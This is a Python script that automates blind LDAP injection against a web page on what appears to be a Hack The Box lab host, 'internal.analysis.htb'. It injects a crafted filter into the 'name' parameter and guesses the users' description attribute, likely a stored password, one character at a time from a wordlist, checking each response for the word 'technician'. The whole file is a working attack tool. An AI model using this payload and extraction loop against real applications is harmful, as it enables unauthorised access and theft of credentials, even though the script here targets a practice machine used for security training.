import os
import requests
import socket

def get_charset_path():
    charset_path = input("Enter the wordlist or charset (press Enter to use the default): ").strip()
    return charset_path if charset_path else "alphanum-case-extra.txt"

def get_modified_url(base_url, char, found_chars):
    return base_url.replace("{FUZZ}", char).replace("{found_char}", found_chars)

def process_response(modified_url):
    try:
        response = requests.get(modified_url)
        response.raise_for_status()
        return "technician" in response.text
    except requests.RequestException as err:
        print("Error making HTTP request:", err)
        return False

def is_host_available(hostname):
    try:
        # Attempt to resolve the hostname to an IP address
        socket.gethostbyname(hostname)
        return True
    except socket.error:
        return False

def main():
    # Check if host is available
    if not is_host_available('internal.analysis.htb'):
        print("Host 'internal.analysis.htb' is not available. "
              "Please add the IP address of the machine to /etc/hosts file.\n"
              "Example:\n 10.129.10.10    analysis.htb internal.analysis.htb")
        return
    charset_path = get_charset_path()
    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    found_chars = ""
    skip_star = 0

    with open(charset_path, 'r') as file:
        charset = list(map(str.strip, file))

    while True:
        for char in charset:
            modified_url = get_modified_url(base_url, char, found_chars)
            print("Modified URL:", modified_url)

            if process_response(modified_url):
                print("Found character:", char)
                found_chars += char
                skip_star += 1
                if skip_star == 6:
                    found_chars += '*'  # Add '*' after every six characters
                break  # Found a character, break to restart the search
        else:
            # No more characters found, exit the loop
            break

    print("Final found characters:", found_chars)

if __name__ == "__main__":
    main()
